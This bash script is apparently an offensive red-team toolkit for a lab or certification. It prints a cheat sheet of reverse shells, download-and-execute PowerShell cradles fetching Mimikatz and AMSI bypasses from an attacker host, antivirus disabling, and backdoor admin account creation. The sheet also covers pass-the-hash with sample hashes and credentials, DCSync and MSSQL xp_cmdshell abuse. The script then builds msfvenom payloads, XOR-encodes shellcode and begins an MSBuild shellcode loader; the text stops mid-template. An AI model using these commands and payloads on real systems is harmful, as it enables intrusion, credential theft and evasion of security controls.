#!/bin/bash

VICTIM="victim.com"


#######################################
# Cleanup files from the current directory.
# Globals:
#   None
# Arguments:
#   None
#######################################

cleanup(){
    echo -e "\n"
    echo ".....................................CLEANING UP..................................................."
    echo -e "\n"

    # Remove the directory generated for the msf payloads
    rm -rf msf_tmp
    rm  ../xml/*.raw

}

# Remove the directories and files that were created during the process

if [ "$1" == "clean" ] ; then
    cleanup
    exit
fi

# Define the Verified/location of all the tools

current_dir=$(pwd)
mkdir -p msf_tmp
mkdir -p out


IP=$(ip a show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')


cat <<END
################################################
    Online Tools
################################################
https://exploit-me.com/
https://www.revshells.com/
https://raikia.com/tool-powershell-encoder/
https://www.jackson-t.ca/runtime-exec-payloads.html
https://lolbas-project.github.io/
https://gtfobins.github.io/
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a  (Kerberos)

# Color the text
tput setaf 3;cat commands.txt 
################################################
    Client side attack
################################################
sendemail -f attacker@email.com -t vactim@email.com -u attacker -m attackerpass -s x.x.x.x:25 -vvv -a resume.doc

###############
Fix the bugs
##############
Invoke-Command -ComputerName dc02 -ScriptBlock {ipconfig}

################################################
    Information Gathering
################################################
nmap -f -oG $VICTIM.nmap_quick $VICTIM
nmap --open -Pn -p - -sV -sC -T4 -oA $VICTIM.nmap_full --open $VICTIM
nmap -p0- -v -A -T4 -oA $VICTIM.nmap_full_aggresive $IP

# Proof
hostname & type c:\Users\Administrator\Desktop\proof.txt   & ipconfig
# Windows
echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"

# Linux
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "

###############################################
    tty shell Update
###############################################
python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl+z
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm-256color

################################################
    Initial Shell (nc_port:446, python_port:4242) 
################################################

powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://$IP/Verified/ps/nc.txt');"   
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($IP,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
  
  
-------Meter_preter------------------
cmd.exe /c powershell wget http://$IP/Verified/new/payload.xml -O C:\ProgramData\payload.xml;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\ProgramData\payload.xml
(New-Object System.Net.WebClient).DownloadString('http://192.168.49.57/Verified/bad.ps1') | IEX

----------Start Powershell------------------   
powershell.exe -nop -ep bypass

---Powershell_repal--------
curl -o powershell-repl.csproj http://$IP/Verified/xml/powershell-repl.csproj && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe powershell-repl.csproj
  


################################################
    Bypass_AV_AMSI_Constrained_MODE_APPLOCKER
################################################

----------Constrained_mode------------------
\$ExecutionContext.SessionState.LanguageMode
wget http://10.10.14.105/Verified/bin/bypass-clm.exe -o C:\ProgramData\bypass-clm.exe --> exe not present.
                 
----------AMSI BYPASS--------------
powershell.exe -nop -ep bypass
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/amsi-bypass.txt') | IEX
    
----------Applocker Bypass-----------
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\ProgramData\bypass-clm.exe 

---------Disable Antivirus------------
Set-Mppreference -disablerealtimemonitoring 1 

--------Disable Restricted_mode------
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0


###############################################
Privielge Escalation
###############################################
PrintSpoofer.exe -i -c cmd.exe



################################################
Weaponized tools.
################################################
  
curl -o ADCollector.exe  http://$IP/Verified/bin/ADCollector.exe
curl -o nmap.zip  http://$IP/Verified/nmap/nmap-7.92-win32.zip
curl -o Mimi_new.zip  http://$IP/Verified/compressedfile/Mimi_new.zip
curl -o npcap.exe http://$IP/Verified/nmap/npcap-1.60.exe
curl -o PsExec64.exe  http://$IP/Verified/bin/PsExec64.exe 
curl -o Rubeus.exe  http://$IP/Verified/bin/Rubeus.exe 
curl -o chisel.exe  http://$IP/Verified/bin/chisel.exe 
curl -o SharpUp.exe  http://$IP/Verified/bin/SharpUp.exe 
curl -o SpoolSample.exe  http://$IP/Verified/bin/SpoolSample.exe 
curl -o SharpHound.exe  http://$IP/Verified/bin/SharpHound.exe
curl -o DAFT.exe  http://$IP/Verified/SQLAUDIT/DAFT.exe 

v#TODO
curl -o SQLServerClient.exe  http://$IP/Verified/bin/SQLServerClient.exe 
curl -o PrintSpooferNet.exe  http://$IP/Verified/bin/PrintSpooferNet.exe 
curl -o katzimim.exe  http://$IP/Verified/bin/katzimim.exe 
curl -o MiniDump.exe  http://$IP/Verified/bin/MiniDump.exe 
curl -o HollowEvade.exe  http://$IP/Verified/bin/HollowEvade.exe 
curl -o FilelessLateralMovement.exe  http://$IP/Verified/bin/FilelessLateralMovement.exe 


(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/SharpHound.txt') | IEX; Invoke-BloodHound -CollectionMethod All
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/PowerUp.txt') | IEX; Invoke-AllChecks | Out-File -FilePath ~\powerup.txt
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/Invoke-Mimikatz.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/HostRecon.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/LAPSToolkit.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/PowerView.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/PowerUpSQL/PowerUpSQL.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/Powermad.txt') | IEX
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/powerviewv1.txt') | IEX

\$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest 'http://192.168.49.57/Verified/bin/winPEASx64_ofs.exe' -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main('log')

\$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest 'http://192.168.49.57/Verified/bin/Rubeus.exe' -UseBasicParsing | Select-Object -ExpandProperty Content)); [Rubeus.Program]::Main("dump".Split())

#TODO
Invoke-ShareFinder
(New-Object System.Net.WebClient).DownloadString('http://$IP/Verified/ps/nice-function.txt') | IEX; Nice-Function -dd84f627e34042a19d0e69bbfb56125d \$buf



################################################
Lateral_Moment_commands
################################################
psexec.py : 445
dcomexec.py : 135,445,(49751 dcom)
smbexec.py : 445
wmiexec.py : 135,445,(50911 winmgmt)
atexec.py : 445
crackmapexec 

Invoke-Command -ComputerName dc02.dev.final.com -ScriptBlock {type C:\\Users\\Administrator\\Desktop\\proof.txt}

evil-winrm -i 192.168.57.121 -u 'blahblah\ted' -p 'ksecurity'
evil-winrm -i 192.168.57.121 -u 'blahblah\ted' -H 'e929e69f7c290222be87968263a9282e'

######################
Enable RDP
######################
# Add User
net user evilme evilme /add
net localgroup "Administrators" evilme /add
net group ""Enterprise Admins"" offsec /add /domain
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

# Allow Remote Access
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f



%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe 
.\Rubeus.exe monitor /interval:1 /nowrap
.\PsExec.exe -i -s -d powershell
.\SpoolSample.exe dc02.dmzacbank.com appsrv09.dmzacbank.com


mimikat#
  privilege::debug
  !processprotect /process:lsass.exe /remove
  sekurlsa::logonpasswords
  lsadump::dcsync /all /csv
  
  
#kekeo
 tgt::delgate
  
  
# Pass-The-Hash and or Restricted Admin login
// if you want to connect to RDP using mimikatz
sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"

// if you want to connect to target machine using mimikatz powershell
mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"

// if you want to connect to target machine using xfreedesktop
Enter-PSSession -Computer <Target>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress> 
xfreerdp /d: /u: /pth:HASH /v:HOST /cert-ignore -dynamic-resolution /drive:Verified,/path/to/Verified /timeout:60000


################################################
Blood-Hound Queries
################################################
Return all computers.
    MATCH (u:Computer)  return u.name

Return all nodes with outgoing permision.
    MATCH (n)-[r]->(g) where r.isacl = true return distinct(n.name)



####################################################################################
Attacking from Linux
####################################################################################

================
Turn of automatic date and time
================
timedatectl set-ntp 0
ntpdate 192.168.57.5


#############################
Crackmap
#############################
# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb --kdcHost 192.168.57.5  192.168.57.0/24 --gen-relay-list relay.txt 

# PSEXEC
crackmapexec smb  192.168.57.121   -d blahblah -u 'ted' -H ':e929e69f7c290222be87968263a9282e' -x 'whoami'

# WINRM
crackmapexec winrm 192.168.57.121   -d blahblah -u 'ted' -H 'e929e69f7c290222be87968263a9282e' -x 'whoami'

# Password_spray
proxychains4 -q  crackmapexec smb 172.16.57.0/24 -u 'Administrator' -d '.' -H '8388d07604009d14cbb78f7d37b9e887'

#############################
pywerview
#############################

#  Hint:
#  use --hashes if you dont have passwowrd.  )
#  usefull: get-netdomaintrust, get-netgroupmember, get-netshare, get-netfileserver, get-netsubnet

python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomain  -u 'ted'  -t 'dc03.blahblah.com'  -p 'ksecurity'
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomaintrust  -u 'ted'  -t 'dc03.blahblah.com'  -p 'ksecurity'
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' 
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --unconstrained
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' -spn '*'
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroup  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' | awk 'NF' > groupts.txt
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroupmember  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --groupname PswReaders
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' 
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --unconstrained
python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser  -u 'ted' -d 'blahblah.com' -t 'dc03.blahblah.com'  -p 'ksecurity' --spn 


# Compare Groups with the default groups and find the difff
PATH : /mnt/hgfs/Shared_Folder/Verified/default_data/groups.txt
cat groupts.txt | anew /mnt/hgfs/Shared_Folder/Verified/default_data/groups.txt 



##########################
Convert Ticket to kerbi formate.
########################
# Hint: If TGT ticket is not working please try using kekeo to get ticket tgt::delgate (This solved the problem of null sessions)

cat /tmp/krb5cc_742201114_vjlDum |base64 -w 0
echo '======' | base64 -d > user.ccache
ticketConverter.py user.ccache user.kirbi
mimikataz#
kerberos::ptt user.kirbi
Enter-PSSession -ComputerName web01

---From windows to linux
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>"))


##########################################
IMPACKET
##########################################
# Hint: 
# replace -hashes with -k -no-pass (if kerberos) 
# IMPORTANT NOTE: DOMAIN NAME SHOULD NOT BE RETURN IN SINGLE QOUTE ELSE IT IS CASE SENSITIVE AND YOU WILL GET 
# USE /etc/resolve.conf  #Because kerberos is  bitch.

# PSEXEC (Pass the Hash)
impacket-psexec -hashes ":e929e69f7c290222be87968263a9282e" "blahblah/ted"@192.168.57.121
impacket-psexec -no-pass -k  PROD.CORP1.COM/offsec@APPSRV01.PROD.CORP1.COM -dc-ip 192.168.57.70 

# WMIEXEC (Pass the Hash)
impacket-wmiexec -hashes ":e929e69f7c290222be87968263a9282e" "blahblah/ted"@192.168.57.121

# NTLMRELAYX (NTLMV2 RELAY)
impacket-ntlmrelayx.py -smb2support -t 10.10.10.1 -c 'whoami /all' -debug

# Convert Ticket to kerbi formate.
python ticket_converter.py ticket.kirbi ticket.ccache
kirbi2ccache ticket.kirbi wow.ccache
export KRB5CCNAME=<TGT_ccache_file>

# DCSYNC
impacket-secretsdump -just-dc  'blahblah/pete@192.168.57.120' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"

# Normal pc secrets dump
impacket-secretsdump   'blahblah/pete@192.168.57.121' -hashes ":00f50c4047ef95b6349492e3eb0a1b41"

# Get user emails
impacket-GetADUsers -no-pass -k  CORP1.COM/offsec -dc-ip 192.168.57.5 

# Kerberoasting / relay Attacks
impacket-GetUserSPNs -no-pass -k  CORP1.COM/offsec -dc-ip 192.168.57.5  -outputfile lab1/output_tgs


# MSSQL CONNECT & SMB RELAY ATTACK
impacket-mssqlclient -no-pass  -k    corp1.com/offsec@appsrv01.corp1.com
impacket-mssqlclient -no-pass  -k    corp1.com/offsec@dc01.corp1.com


###########################################
#   MSSQL - Queries
##########################################
# https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs
# use db "master"

# Enumerate login info
SELECT SYSTEM_USER;

# Enumerate database username.
SELECT USER_NAME();

# Enumerate if user is member of Public or Sysadmin. If role is one then true.
SELECT IS_SRVROLEMEMBER('public');
SELECT IS_SRVROLEMEMBER('sysadmin');

# Force NTLM authentication for hash-grabbing or relaying
EXEC master..xp_dirtree "\\192.168.49.67\share"
impacket-ntlmrelayx.py -smb2support -t 10.10.10.1 -c 'whoami /all' -debug

# Get logins that we can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; 

# Impersonate login and get login information
EXECUTE AS LOGIN = 'sa';
use msdb; EXECUTE AS USER = 'dbo';

# Impersonate dbo in trusted database and execute through 'xp_cmdshell'
use msdb; EXECUTE AS USER = 'dbo';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Impersonate dbo in trusted database and execute through 'sp_OACreate' 
use msdb; EXECUTE AS USER = 'dbo';
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'whoami';

########
# Enumerate linked servers
########
EXEC sp_linkedservers;
Linked SQL server: DC01


#########
# Execute on linked server
#########
EXECUTE AS LOGIN = 'sa';
EXEC sp_serveroption 'SQL03', 'rpc out', 'true';
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;
EXEC ('xp_cmdshell ''whoami'';') AT SQL03;
EXEC ('xp_cmdshell ''powershell.exe -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUANwAvAFYAZQByAGkAZgBpAGUAZAAvAHAAcwAvAG4AYwAuAHQAeAB0ACcAKQA7AA=='';') AT SQL03;

############
# Execute on linked server via 'openquery'
############
select version from openquery("dc01", 'select @@version as version')
select 1 from openquery("dc01", 'select 1; EXEC sp_configure ''show advanced options'', 1; reconfigure')
select 1 from openquery("dc01", 'select 1; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure')
select 1 from openquery("dc01", 'select 1; exec xp_cmdshell '"powershell whoami"')
select * from openquery("sql03",'exec master..xp_cmdshell "powershell whoami"')

############
# Escalate via double database linkedString
##############

# Enabling advanced options on appsrv01 using AT
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01

# Find the login on DC01
select mylogin from openquery("dc01", 'select SYSTEM_USER as mylogin');

#  Finding the login on APPSRV01 after following the links
select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')

select * from openquery("dc01", 'select * from openquery("appsrv01", ''select (SYSTEM_USER)'')')
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01
EXEC ('EXEC (''xp_cmdshell ''''whoami /priv'''';'') AT appsrv01') AT dc01


##############################
Powerup SQL
##############################
# Find sql servers
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Audit the SQL instance
Invoke-SQLAudit -Verbose -Instance SQLServer1

# Privielge Esclate using powerupsql.
Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1

# Get linked servers.
Get-SQLServerLinkCrawl -Instance  web06

Executing Commands 
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'

Get-SQLQuery -Verbose -Instance "web06.dev.final.com" -Query "EXEC sp_serveroption 'SQL03', 'rpc out', 'true';" 
Get-SQLQuery -Verbose -Instance "web06.dev.final.com" -Query "EXEC sp_serveroption 'SQL03', 'rpc', 'true';"




##############################################
Cracking
#############################################

# Cracking Net NTLMv2 HASH
hashcat -m 5600 hash.txt dic.txt --force

# Cracking Kerberoasting, getuserspn, tgs files
hashcat -m 13100 --force <TGSs_file> <passwords_file>
john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>

# Cracking ssh private key password.
/usr/share/john/ssh2john.py id_rsa.johny > sshhash.txt
john sshhash.txt --wordlist=/usr/share/wordlists/rockyou.txt


# Cracking Ansible
ansible2john test.yml
hashcat testhash.txt --force --hash-type=16900
cat pw.txt | ansible-vault decrypt


# Bcyrpt
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt


END





cat << EOF > msf_tmp/certificate_msfvenom.pem
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDbnuWqr6QlQmf7Ly+eB08oW/1DkOvFywwD3HgJJeZir+u04BXE
ahTKyLNtCBLVDrhiW8i6LkaamDquVysU72CJYEFDwQCAMjVN94F8DDNpd1I+Rpp/
AvFuJGA7WjFCrYtEBVQGy6yxQj6Y8CQNLzlVM6oLpYpZyGj727WxS80ACQIDAQAB
AoGAWtMgyfDvYlVPKUr/V0xQiTFZ0Pp69wacxnAD2EyrNX7pbJkLh3oTdTWBNoMT
Prdiu5KXtZ9zpXV1Nypnb7X7ZrCfNtMWOT3qEDjDX3Fy1cua2j8jwzu9yuys7RkD
LpKLaleG1KLIjBkVWKZ66c9NAurtm9MmnyRVsV9h7/CAgO0CQQDuaB2r5mTLc4L+
OLNVm+DttVOU09ktusbVHa/ckYAFeqhqesBWWQMPLb5+K+9cbaKVfThpLoa0vLej
e6LzSkYHAkEA69PiKEkE/G08ZXeEpqoNttdRw2RCreHkrBnFYeiR35NtqarBPkvE
LE7iUwewdkUPa4Ohkumd6KjvXGs3cFGFbwJAVe5FM56ZmhOKlaNOUH8c9dEzzSMG
1srJvCs1JiVzpYXuimKwTO9MgP4V+VhQsFn8DjHSUWcpup+C+XQo6dRNpQJAVhAM
T+FeBXUj/m+gpGYY/SoVN7ZmMyjmF/yLsRB789jMw4eCYGasH/Nl2yFKP88yMm1m
UMQbEaZdPCAQqlfF1wJBAMSxs1DVQoIUDnNCq+ajVWIVzHaoKxsVpf1Wfc3PNT5u
WZ+Fw7KdOyasjHYCVmBYTvbi5Lkw8wqIUX69RtrZVOY=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICSTCCAbKgAwIBAgIJBaShWvkcA8RmMA0GCSqGSIb3DQEBCwUAME4xMTAvBgNV
BAsMKE5vIFNOSSBwcm92aWRlZDsgcGxlYXNlIGZpeCB5b3VyIGNsaWVudC4xGTAX
BgNVBAMTEGludmFsaWQyLmludmFsaWQwHhcNMTUwMTAxMDAwMDAwWhcNMzAwMTAx
MDAwMDAwWjBOMTEwLwYDVQQLDChObyBTTkkgcHJvdmlkZWQ7IHBsZWFzZSBmaXgg
eW91ciBjbGllbnQuMRkwFwYDVQQDExBpbnZhbGlkMi5pbnZhbGlkMIGfMA0GCSqG
SIb3DQEBAQUAA4GNADCBiQKBgQDbnuWqr6QlQmf7Ly+eB08oW/1DkOvFywwD3HgJ
JeZir+u04BXEahTKyLNtCBLVDrhiW8i6LkaamDquVysU72CJYEFDwQCAMjVN94F8
DDNpd1I+Rpp/AvFuJGA7WjFCrYtEBVQGy6yxQj6Y8CQNLzlVM6oLpYpZyGj727Wx
S80ACQIDAQABoy8wLTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBRtmAzVukvocnpw
BmnDWxWvG/JbVTANBgkqhkiG9w0BAQsFAAOBgQDTdF2geFKT6rTvxcNtLTFKN+3p
swsv9KcR62M917KhEmLo138mw8c+6ORXL2Mz8PEPQwsPi2L5qv/+eUG5S6klfkD4
5/HqJEjVf0A6rH2HXIuzGpR0klGzYbUu9LUFCPUMiCtyblx3pmup7+2JLPXyZe/Q
7g8YVuWjBlakDDkgKw==
-----END CERTIFICATE-----
EOF



cat << EOF > msf_tmp/msf2.py
import argparse
import logging
import os
import subprocess

def msfVenom(command, choosenPayload, ext):
    finalCommand = "msfvenom " + command
    print("Paylaod Generator: " +  choosenPayload.split("/")[-1]  + ":" + ext +"\n" + finalCommand)
    logging.debug("Executing msfvenom : %s \n", finalCommand)
    msf = subprocess.run([finalCommand], shell = True, capture_output=True)

    if (ext != "raw"):
        # remove \r\n charachter at the end 
        cleanEnding = msf.stdout.rstrip()

        # remove b' in the start - converting to python string
        convertToString = cleanEnding.decode()
        logging.debug(convertToString)
        msfConsole = open("msf_tmp/" + choosenPayload.split("/")[-1] + "." + ext, "w")
        msfConsole.write(convertToString)
        msfConsole.close()


def test_asif(payload, lhost, lport, ext, ssl):
    # get the current directory
    currentDirectory = os.getcwd() + "/"
    certPath = currentDirectory + "msf_tmp/certificate_msfvenom.pem"

    if ssl == 0:
        if not "raw" in ext:
            command = "-p " + payload + " LHOST=" + lhost + " LPORT=" + str(lport) + " -f " + ext
            print("\nListener: " + payload.split("/")[-1])
            print("msfconsole -x \"use exploit/multi/handler; set payload %s; set lhost %s; set lport %s; exploit -j\" \n" % (payload, lhost, lport))
        else:
            command = "-p " + payload + " LHOST=" + lhost + " LPORT=" + str(lport) + " -f " + ext + " -o " + currentDirectory + "msf_tmp/" + payload.split("/")[-1] + ".raw"
    else:
        
        if not "raw" in ext:
            command = "-p " + payload + " LHOST=" + lhost + " LPORT=" + str(lport) + " -f " + ext +  " StagerVerifySSLCert=true " + "handlersslcert=" + certPath 
            print("\nListener: " + payload.split("/")[-1]) 
            print("msfconsole -x \"use exploit/multi/handler; set payload %s; set lhost %s; set lport %s; set StagerVerifySSLCert true; set handlersslcert %s; exploit -j\" \n" % (payload, lhost, lport, certPath))
        else:
            command = "-p " + payload + " LHOST=" + lhost + " LPORT=" + str(lport) + " -f " + ext +  " StagerVerifySSLCert=true " + "handlersslcert=" + certPath + " -o " + currentDirectory + "msf_tmp/" + payload.split("/")[-1] + ".raw"
    msfVenom(command, payload, ext)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", help="Enter attacker machine IP (default taken from tun0")
    parser.add_argument("--port", help="Enter attacker machine Port (default: 443)", type=int)
    parser.add_argument("--verbose", help="increase output verbosity", action="store_true")
    parser.add_argument("--filetype", help="Enter payload type e.g ps1, csharp")
    parser.add_argument("--payload", help="Enter payload")
    parser.add_argument("--ssl", help="Enable ssl", type=int)
    args = parser.parse_args()

    if args.verbose:
       logging.basicConfig(level=logging.DEBUG, format='%(message)s')
    else:
       logging.basicConfig(level=logging.INFO, format='%(message)s')

    
    test_asif(args.payload, args.ip, args.port, args.filetype, args.ssl)    

if __name__ == "__main__":
    main()
EOF

cat << EOF > xor.py

import argparse
from ast import Bytes
from collections import namedtuple
import sys
import ctypes


def format_sc(sc):
    """Format the shellcode for pasting in C/C++, C#, Java, or Visual Basic projects.
    Takes shellcode as bytes, returns formatted bytes.
    """

    sc = ["{0:#0{1}x}".format(int(x),4) for x in sc] 

    CodeFormat = namedtuple('CodeFormat', 'open close heading items_per_line func')
  
    cf = CodeFormat(open='{\n', close='\n};', heading='byte[] shellcode = ', items_per_line=12, func=None)

    if cf.func:
        sc = cf.func

    iterations = (len(sc) // cf.items_per_line) if len(sc) % cf.items_per_line == 0 else (len(sc) // cf.items_per_line + 1)

    iteration = 0
    index = [0, cf.items_per_line]
    lines = []

    while iteration < iterations:
        line = ', '.join(sc[index[0]:index[1]])
        lines.append(line)
        index[0] = index[1]
        index[1] = index[1] + cf.items_per_line
        iteration += 1

    sc = ',\n'.join(lines)
    sc = cf.heading + cf.open + sc + cf.close

    return sc.encode()

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--inputfile', 
                        help='File containing shellcode or read from <stdin>')
						
parser.add_argument('-o', '--outputfile', 
                        help='Output file name')


args = parser.parse_args()

filename = args.inputfile

with open(filename,"rb") as f:
	buff = f.read()

def xor(buff):
	encoded  = [None] * len(buff)
	for i in range(0,len(buff)):
		encoded[i] = ((( buff[i] + 3) ^ 0xAA) & 0xFF)
	

	return encoded

e_buff = xor(buff)


#   //encoded[i] = (byte)((((uint) buf[i] + 3) ^ 0xAA) & 0xFF); //Encrypter
#    encoded[i] = (byte)((((uint)buf[i] ^ 0xAA) - 3) & 0xFF);  //Decrypter
output = args.outputfile
with open(output,"wb") as of:
	of.write(format_sc(e_buff))


EOF



#######################################
# Create XML Payload with Encrypted (XOR) shellcode
# Globals:
#   None
# Arguments:
#   None
# Outputs:
#   Insert the xor shellcode in the XML and output that to a file
#######################################

create_xml_payload(){
    echo -e "\n"
    echo "-------------XML_Payloard------------"
    echo -e "\n"
#    bash xml_payload_gen/xml_gen.sh reverse_winhttps.raw
 #   bash xml_payload_gen/xml_gen.sh reverse_https.raw
 #   bash xml_payload_gen/xml_gen.sh reverse_tcp.raw


    # Name of the output directory to which we want to save our final XML payload
    # after modification
    OUTFILE="$current_dir/../xml/"

    # Location of the msf generated files
    INFILE="$current_dir/msf_tmp/"


    # Execute the python xor script on the msf payload and output encoded payload (xored)
    # in the same directory with the name encoded_<payload_name>.raw
    python3 xor.py -i $INFILE$1 -o $INFILE"encoded_$1"

    # Take the encoded payload output generated by the python xor tool and add it to the xml payload
    shellcode=$(cat $INFILE"encoded_$1")


# The XML payload template - it have the shellcode in it $shellcode

cat << EOF > $OUTFILE$1    
        <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
          <!-- This inline task executes x64 shellcode. -->
          <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
          <!-- Save This File And Execute The Above Command -->
          <!-- Author: Casey Smith, Twitter: @subTee --> 
          <!-- License: BSD 3-Clause -->
          <Target Name="Hello">
            <ClassExample />
          </Target>
          <UsingTask
            TaskName="ClassExample"
            TaskFactory="CodeTaskFactory"
            AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
            <Task>
    
              <Code Type="Class" Language="cs">
              <![CDATA[
                using System;
                using System.Runtime.InteropServices;
                using Microsoft.Build.Framework;
                using Microsoft.Build.Utilities;
                public class ClassExample :  Task, ITask
                {         
                  private static UInt32 MEM_COMMIT = 0x1000;          
                  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          
          
              [DllImport("kernel32.dll", SetLastError = true)]
                      public static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

                  [DllImport("kernel32")]
                    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,
                    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
            
            

                      [DllImport("kernel32.dll", SetLastError = true)]
